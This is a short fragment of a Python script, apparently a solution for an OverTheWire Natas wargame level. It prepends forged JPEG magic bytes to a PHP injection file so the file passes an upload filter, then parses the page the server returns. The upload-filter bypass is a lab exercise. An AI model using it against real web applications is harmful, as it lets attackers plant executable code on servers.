...
dir = pathlib.Path(f"./natas/code/natas{level}-inject.php")

with open(dir, "r") as f:
    content = f.read()

if "\xFF\xD8\xFF\xE0" not in content:
    print("Forging .JPEG File Signature", end="...")
    
    with open(dir, "w+") as f:
        f.writelines(["\xFF\xD8\xFF\xE0", "\n", content])
...
content = inject_soup.get_text()

result = "".join(filter(lambda c: c.isprintable() and ord(c) < 127, content))
